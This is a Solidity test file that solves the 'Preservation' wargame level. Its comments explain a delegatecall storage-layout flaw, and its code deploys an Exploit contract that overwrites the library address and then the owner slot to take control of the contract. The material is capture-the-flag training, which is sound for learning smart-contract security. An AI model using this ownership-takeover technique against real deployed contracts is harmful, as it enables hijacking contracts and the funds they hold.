// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Preservation.sol";
import "src/levels/PreservationFactory.sol";

contract TestPreservation is BaseTest {
    Preservation private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new PreservationFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /**
         * CODE YOUR SETUP HERE
         */
        levelAddress = payable(this.createLevelInstance(true));
        level = Preservation(levelAddress);

        // Check that the contract is correctly setup
        assertEq(level.owner(), address(levelFactory));
    }

    function exploitLevel() internal override {
        /**
         * CODE YOUR EXPLOIT HERE
         */

        // Preservation contract is vulnerable to attack via delegatecall, because it does not account for storage layouts of the library contracts.
        // setFirstTime() and setSecondTime() functions in Preservation contract delegatecall to the setTime() function, which changes the storage slot 0.
        // But since its delegatecall, the storage slot 0 is changed in the context of the Preservation contract, not the LibraryContract.

        // We can use this to set timeZone1Library to the address of a mallicious contract, which implements the setTime().
        // The storage layout then should copy the storage layout of the Preservation, but the setTime() function must change the storage slot 2.
        // This way we can change the owner of the Preservation contract to any address we want.

        vm.startPrank(player, player);

        // Deploy a mallicious contract that implements the setTime() function and mirrors the storage layout of the Preservation contract.
        Exploit exploit = new Exploit(level);

        // Set timeZone1Library to the address of the Exploit contract.
        level.setFirstTime(uint256(address(exploit)));

        // Call the same function to change the owner of the Preservation contract.
        level.setFirstTime(uint256(player));

        vm.stopPrank();
    }
}

contract Exploit {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    Preservation public victim;

    constructor(Preservation _victim) public {
        victim = _victim;
    }

    function setTime(uint256 _time) public {
        owner = address(uint160(_time));
    }
}
